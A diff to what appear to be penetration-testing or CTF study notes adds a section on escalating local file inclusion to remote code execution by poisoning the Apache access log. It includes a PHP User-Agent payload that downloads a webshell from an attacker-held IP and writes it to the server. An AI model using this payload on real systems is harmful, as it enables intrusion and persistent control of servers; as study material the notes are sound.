@@ -111,6 +111,20 @@
 
   we can get rid of the suffix (for LFI) using a NULL BYTE. For RFI, you can get rid of the suffix, by adding `&blah=` or `?blah=` depending on your URL.
 
+### LFI to RCE
+
+* after getting LFI we can read `/etc/passwd` so now we can also read `/var/log/apache2/access.log` in this file all the logs are saved.
+
+* we see that in this logs file if anyone access the website then his **ip address** and **user-agent** are saved in this file.
+
+  that means if we modify our **user-agent** in the request and put our payload inside it then it will be echoed in this log file.
+
+* so we can make a python http server on port 1234 and upload a webshell to the server by following payload:
+
+  ```
+  User-Agent: <?php file_put_contents('shell.php',file_get_contents('http://10.8.82.228:1234/phpshell.php')) ?>
+  ```
+
 ### LDAP
 
 * some LDAP servers authorise NULL Bind: if null values are sent,
